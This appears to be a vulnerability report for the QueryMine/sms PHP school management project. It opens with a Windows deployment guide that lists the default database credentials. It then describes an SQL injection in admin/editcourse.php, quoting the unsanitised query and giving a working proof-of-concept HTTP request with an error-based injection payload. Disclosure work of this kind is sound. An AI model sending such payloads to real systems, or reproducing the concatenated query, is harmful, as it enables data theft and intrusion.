# QueryMine/sms PHP Project Deployment Document (Windows Local)

# 1. Project Overview

This document is a local deployment guide for the QueryMine/sms PHP project on the Windows system, detailing the environment preparation, database configuration, project startup and verification steps to help users quickly complete the local deployment of the project.

Project Repository Address: https://github.com/QueryMine/sms

# 2. Local Deployment Steps (Windows)

## 2.1 Environment Preparation

Prepare the following running environments to ensure the project runs normally. The code style and SQL comments of the project show that the historical running environment is PHP 7.2/7.3, so it is recommended to use a compatible version.

- PHP Version: 7.3+ (PHP 7.2/7.3 is recommended for better compatibility with the project)

- Database: MySQL 5.7+ or MariaDB 10.x (ensure the database service can start normally)

- Web Server: Apache (XAMPP is recommended for one-click deployment) or PHP built-in server (for quick demonstration)

## 2.2 Database Configuration

Complete the database creation and SQL import according to the following steps to ensure the project can connect to the database normally.

1. Start the MySQL/MariaDB service locally, open the database management tool (such as phpMyAdmin, Navicat), and create a database named`sms` (the database name must be consistent with the subsequent configuration).

2. Find the `sms.sql` file in the project root directory, import it into the newly created `sms` database.

3. Note: The `sms.sql` file contains non-business necessary segments such as phpmyadmin and test. For the production environment, it is recommended to only import the sms segment to avoid unnecessary data redundancy and security risks.

## 2.3 Modify Database Connection Configuration

The project uses the `dbcon.php` file to store database connection information. Modify the configuration according to the local database account information to ensure the project can connect to the database successfully.

- Find the `dbcon.php` file in the project root directory and open it with a code editor (such as Notepad++, VS Code).

- The default database connection configuration in the file is as follows:

- Database Username: sms

- Database Password: sms123

- Database Host: localhost

- Database Name: sms

Modify the above parameters according to the local database account (such as username root, custom password) and save the file.

## 2.4 Start the Project

Two startup methods are provided below. You can choose according to your local environment configuration. Both methods can realize normal access to the project.

### Method A: Start with XAMPP (Recommended)

1. Install XAMPP (contains Apache and MySQL services), open the XAMPP control panel.

2. Copy the entire project directory to the `htdocs` directory under the XAMPP installation path, and rename the project directory to `sms` (ensure the path is `XAMPP/htdocs/sms`).

3. In the XAMPP control panel, start the Apache and MySQL services (ensure both services are in the "Running" state).

4. Open the browser and enter the access address: `http://localhost/sms/` to access the project.

### Method B: Start with PHP Built-in Server (CLI)

1. Open the Windows command prompt (CMD) or PowerShell.

2. Use the `cd` command to enter the project root directory. For example, if the project is stored in `d:\PHP Code Audit\sms`, execute the following command:
        `cd "d:\PHP Code Audit\sms"`

3. Execute the following command to start the PHP built-in server:
        `php -S 127.0.0.1:3000 -t .`

4. After the server starts successfully, open the browser and enter the access address: `http://127.0.0.1:3000/` to access the project.

## 2.5 Verify Project Access

After starting the project, verify whether each entrance can be accessed normally to confirm the deployment is successful. The main access entrances of the project are as follows:

- Project Homepage: `/` (access the root address directly, such as http://localhost/sms/ or http://127.0.0.1:3000/)

- Teacher Login Page: `/login.php` (access address example: http://localhost/sms/login.php)

- Student Login Page: `/students/login.php` (access address example: http://localhost/sms/students/login.php)

- Background Management Page: `/admin/dashboard.php` (requires a valid login state to access, log in with the corresponding account first)

# 3. Common Notes

- If the project cannot connect to the database, check whether the MySQL/MariaDB service is started, and whether the username, password, database name in `dbcon.php` are consistent with the local configuration.

- If the PHP version is too high (such as PHP 8.0+), there may be compatibility issues. It is recommended to use PHP 7.3 for deployment.

- When using the PHP built-in server, do not close the command prompt window during the running of the project; closing the window will stop the server.

- For the production environment, it is recommended to delete non-business segments in the`sms.sql` file, and configure complex database passwords to improve security.

# 4. Vulnerability Details

## V-01 SQL Injection (admin/editcourse.php?id)

### 4.1 Code Evidence

The `admin/editcourse.php` file is responsible for handling the course editing function in the background management system. When querying course information, the code directly obtains the course ID from the GET request parameter `id` through `$_GET['id']`, and concatenates it into the SQL query statement `SELECT * FROM course WHERE course_id='$get_course_id'` without any input filtering, parameterization or escaping. This results in a SQL injection vulnerability. Attackers can construct malicious request parameters to execute arbitrary SQL statements, obtain sensitive data in the database (such as user credentials, course information), modify or delete data, and even gain server control in severe cases. In addition, the project does not enable the Issue function, making it impossible to submit vulnerability reports and repair suggestions to the project maintainers through the official repository.

```php
SELECT * FROM course WHERE course_id='$get_course_id'
```

### 4.2 PoC Request Packet (Boolean Blind Injection)

```http
GET /admin/editcourse.php?id=59'||(SELECT 0x6d477a43 WHERE 5374=5374 AND (SELECT 9481 FROM(SELECT COUNT(*),CONCAT(0x716a7a7171,(SELECT (ELT(9481=9481,1))),0x716b6a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||' HTTP/1.1
Host: 127.0.0.1:3000
Cookie: PHPSESSID=<已登录会话>
Connection: close
```
![](https://pic1.imgdb.cn/item/69c240f02cb231a0e8757cec.png)

![](https://pic1.imgdb.cn/item/69c241012cb231a0e8757cef.png)

